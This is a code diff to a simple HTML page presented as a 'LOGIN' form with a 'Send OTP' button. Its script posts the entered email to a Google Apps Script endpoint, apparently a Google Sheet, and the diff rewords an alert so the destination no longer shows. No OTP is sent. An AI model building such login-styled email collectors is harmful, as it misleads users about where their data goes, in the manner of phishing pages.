@@ -68,7 +68,12 @@
       transition: background 0.3s ease;
     }
 
-    button:hover {
+    button:disabled {
+      background: #aaa;
+      cursor: not-allowed;
+    }
+
+    button:hover:enabled {
       background: #00cccc;
     }
 
@@ -89,15 +94,20 @@
     <div class="logo">LOGIN</div>
     <form onsubmit="sendToSheet(event)">
       <input type="email" id="email" placeholder="Enter your email" required>
-      <button type="submit">🔐 Send OTP</button>
+      <button type="submit" id="submitBtn">🔐 Send OTP</button>
     </form>
     <div class="footer">Safe • Secure • Fast Login</div>
   </div>
 
   <script>
     function sendToSheet(e) {
-      e.preventDefault(); // stop form from submitting normally
+      e.preventDefault();
+
       const email = document.getElementById('email').value;
+      const submitBtn = document.getElementById('submitBtn');
+
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'Sending...';
 
       fetch('https://script.google.com/macros/s/AKfycbzJ97O5gRgG-STCcQhQ2_b63h6dqQ_o4D1NxnbBcfbRBHNjTdLnEyJfEePjbyaNTxv7/exec', {
         method: 'POST',
@@ -106,14 +116,18 @@
       })
       .then(response => {
         if (response.ok) {
-          alert("✅ Email sent to Google Sheet!");
+          alert("✅ Email submitted successfully!");
         } else {
-          alert("❌ Failed to submit.");
+          alert("❌ Failed to submit to Google Sheet.");
         }
       })
       .catch(error => {
         console.error('Error:', error);
-        alert("⚠️ Error occurred.");
+        alert("⚠️ Network or script error occurred.");
+      })
+      .finally(() => {
+        submitBtn.disabled = false;
+        submitBtn.innerText = '🔐 Send OTP';
       });
     }
   </script>
